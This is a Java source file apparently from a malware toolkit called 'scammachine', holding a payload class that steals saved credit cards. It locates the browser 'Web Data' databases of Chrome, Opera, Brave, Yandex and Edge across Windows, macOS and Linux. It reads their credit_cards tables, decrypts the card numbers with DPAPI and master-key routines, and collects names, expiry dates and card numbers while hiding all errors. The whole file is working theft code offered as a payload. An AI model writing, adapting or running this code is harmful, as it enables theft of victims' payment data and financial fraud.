package me.teejayx6.scammachine.payloadz;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;
import java.util.Base64;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class CreditCards
{
    public static String appdata() {
        return System.getenv("APPDATA");
    }
    public static String localAppdata() {
        return System.getenv("LOCALAPPDATA");
    }
    public static String home() {
        return System.getProperty("user.home");
    }

    public static String execute() {
        StringBuilder sb = new StringBuilder();
        Stream.of(new String[][]{
                {localAppdata() + "/Google/Chrome/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Default/Web Data"},
                {home() + "/.config/google-chrome/Default/Web Data"},
                {appdata() + "/Opera Software/Opera Stable/Default/Web Data"},
                {home() + "/Library/Application Support/Opera/Opera/Default/Web Data"},
                {home() + "/.config/opera/Default/Web Data"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Default/Web Data"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Web Data"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Default/Web Data"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Web Data"},
                {home() + "/.config/Yandex/YandexBrowser/Default/Web Data"},
                {localAppdata() + "/Microsoft/Edge/User Data/Default/Web Data"},
                {home() + "/Library/Application Support/Microsoft/Edge/Default/Web Data"},
                {home() + "/.config/Microsoft/Edge/Default/Web Data"}
        }).collect(Collectors.toMap(data -> new File(data[0]), data -> new File(data[0]))).entrySet().stream().filter(entry -> entry.getKey().exists() && entry.getValue().exists()).forEach((entry) -> {
            Connection c;
            Statement stm;

            try {
                TempFile tmpfile2 = FileUtils.readFile(entry.getValue().getAbsolutePath());
                ResultSet re = DriverManager.getConnection("jdbc:sqlite:" + tmpfile2.newpath).prepareStatement("SELECT * from `credit_cards`").executeQuery();

                while (re.next()) {
                    String name = new String(re.getBytes(0));
                    String month = new String(re.getBytes(1));
                    String year = new String(re.getBytes(2));

                    byte[] bytescard = re.getBytes(5);
                    String card;
                    if (new String(bytescard).startsWith(Passwords.kDPAPIKeyPrefix))
                        card = Passwords.getKeyBytes(bytescard, Passwords.GetMasterKey(entry.getKey().getAbsolutePath()));
                    else
                        card = Passwords.decrypt(bytescard, Passwords.GetMasterKey(entry.getKey().getAbsolutePath()));

                    String cc = (String.format("NAME: %s\nDATE: %s/%s\nCARD: %s\n------------\n", name, month, year, card));
                    sb.append(cc);
                }

                FileUtils.close(tmpfile2);
            }
            catch (Exception e)
            {

            }
        });

        return sb.toString();
    }
}
